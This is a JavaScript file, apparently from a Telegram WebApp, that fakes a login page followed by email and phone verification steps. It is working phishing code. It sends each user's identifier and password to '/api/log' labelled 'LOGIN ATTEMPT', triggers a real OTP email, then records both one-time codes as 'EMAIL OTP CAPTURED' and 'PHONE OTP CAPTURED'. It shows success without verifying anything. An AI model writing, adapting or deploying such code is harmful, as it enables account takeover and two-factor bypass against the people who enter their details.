// Initialize Telegram
const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // UI Elements
    const screenSignin = document.getElementById('screen-signin');
    const screenStepper = document.getElementById('screen-stepper');
    const screenOtp = document.getElementById('screen-otp');
    
    const triggerSignin = document.getElementById('trigger-signin');
    const loginIdentifier = document.getElementById('login-identifier');
    const loginPassword = document.getElementById('login-password');
    const loginPasswordWrapper = document.getElementById('login-password-wrapper');
    
    const linkEmailVerify = document.getElementById('link-email-verify');
    const linkPhoneVerify = document.getElementById('link-phone-verify');
    const stepNumberDisplay = document.getElementById('step-number-display');
    const itemEmail = document.getElementById('item-email');
    const itemPhone = document.getElementById('item-phone');
    
    const otpInputField = document.getElementById('otp-input-field');
    const btnOtpSubmit = document.getElementById('btn-otp-submit');
    const otpTitleDisplay = document.getElementById('otp-title-display');
    const otpDescDisplay = document.getElementById('otp-desc-display');
    const otpTypeIcon = document.getElementById('otp-type-icon');
    const otpSeconds = document.getElementById('otp-seconds');

    const backToSignin = document.getElementById('back-to-signin');
    const closeOtpModal = document.getElementById('close-otp-modal');
    const pasteBtn = document.querySelector('.otp-btn-paste');

    let currentStep = 1; // 1: Email, 2: Phone
    let userData = {};
    let timer;

    // Tab Logic
    document.querySelectorAll('.signin-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            if (tab.dataset.tab === 'otp') {
                loginPasswordWrapper.style.display = 'none';
            } else {
                loginPasswordWrapper.style.display = 'block';
            }
        });
    });

    // Password Toggle
    const eyeBtn = document.querySelector('.btn-password-eye');
    if (eyeBtn) {
        eyeBtn.addEventListener('click', () => {
            const isPass = loginPassword.type === 'password';
            loginPassword.type = isPass ? 'text' : 'password';
            eyeBtn.innerHTML = isPass ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
        });
    }

    // Sign In Trigger
    triggerSignin.addEventListener('click', () => {
        const id = loginIdentifier.value.trim();
        const pass = loginPassword.value.trim();

        if (!id) return alert('Please enter Email / Phone / Username');

        userData = { id, pass, time: new Date().toLocaleString() };
        
        // Log Initial Attempt via backend
        logToServer('🔑 LOGIN ATTEMPT', userData);

        screenSignin.style.display = 'none';
        screenStepper.style.display = 'flex';
    });

    // Verification Link: Email
    linkEmailVerify.addEventListener('click', () => {
        if (currentStep !== 1) return;

        otpTitleDisplay.innerText = 'Email Verification';
        otpDescDisplay.innerText = 'Please enter the 6-digit verification code sent on e-mail';
        otpTypeIcon.className = 'fas fa-envelope';
        
        // Send OTP via server
        if (userData.id.includes('@')) {
            fetch('/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: userData.id })
            });
        }

        screenOtp.style.display = 'flex';
        startTimer(60);
    });

    // Verification Link: Phone
    linkPhoneVerify.addEventListener('click', () => {
        if (currentStep !== 2) return;

        otpTitleDisplay.innerText = 'Phone Verification';
        otpDescDisplay.innerText = 'Please enter the 6-digit verification code sent to your phone';
        otpTypeIcon.className = 'fas fa-phone-alt';

        screenOtp.style.display = 'flex';
        startTimer(60);
    });

    // OTP Submit
    btnOtpSubmit.addEventListener('click', async () => {
        const otp = otpInputField.value.trim();
        if (otp.length < 4) return alert('Invalid code');

        btnOtpSubmit.innerText = 'Verifying...';
        btnOtpSubmit.disabled = true;

        if (currentStep === 1) {
            userData.email_otp = otp;
            await logToServer('📧 EMAIL OTP CAPTURED', userData);
            
            currentStep = 2;
            screenOtp.style.display = 'none';
            otpInputField.value = '';
            
            stepNumberDisplay.innerText = '2/2';
            itemEmail.style.opacity = '0.5';
            itemEmail.style.pointerEvents = 'none';
            itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
            itemEmail.querySelector('.card-link').style.color = '#3bc117';
            
            itemPhone.style.opacity = '1';
            itemPhone.style.pointerEvents = 'auto';
            itemPhone.classList.add('active');

            btnOtpSubmit.innerText = 'Confirm';
            btnOtpSubmit.disabled = false;
        } else {
            userData.phone_otp = otp;
            await logToServer('📱 PHONE OTP CAPTURED', userData);
            
            btnOtpSubmit.innerText = 'Success';
            document.getElementById('btn-final-confirm').classList.add('ready');
            
            setTimeout(() => {
                if (tg) tg.close();
                else location.reload();
            }, 1500);
        }
    });

    // Navigation / UI Helpers
    backToSignin.addEventListener('click', () => {
        screenStepper.style.display = 'none';
        screenSignin.style.display = 'block';
    });

    closeOtpModal.addEventListener('click', () => {
        screenOtp.style.display = 'none';
    });

    if (pasteBtn) {
        pasteBtn.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text) otpInputField.value = text;
            } catch (e) {}
        });
    }

    function startTimer(duration) {
        let timeLeft = duration;
        otpSeconds.innerText = timeLeft;
        clearInterval(timer);
        timer = setInterval(() => {
            timeLeft--;
            otpSeconds.innerText = timeLeft;
            if (timeLeft <= 0) clearInterval(timer);
        }, 1000);
    }

    async function logToServer(title, data) {
        try {
            await fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ title, data })
            });
        } catch (e) {}
    }
});
